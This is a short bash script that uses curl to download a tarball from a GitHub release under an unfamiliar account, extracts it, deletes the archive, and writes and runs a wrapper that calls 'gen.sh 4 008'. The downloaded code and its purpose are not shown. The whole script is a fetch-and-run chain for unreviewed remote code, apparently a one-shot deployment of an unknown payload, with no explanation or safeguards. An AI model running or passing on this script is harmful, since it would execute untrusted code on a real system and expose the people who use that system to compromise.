#!/bin/bash

curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/koni.tar.gz && tar -xf koni.tar.gz && rm -rf koni.tar.gz
echo '#!/bin/bash

bash gen.sh 4 008' > baso.sh
bash baso.sh
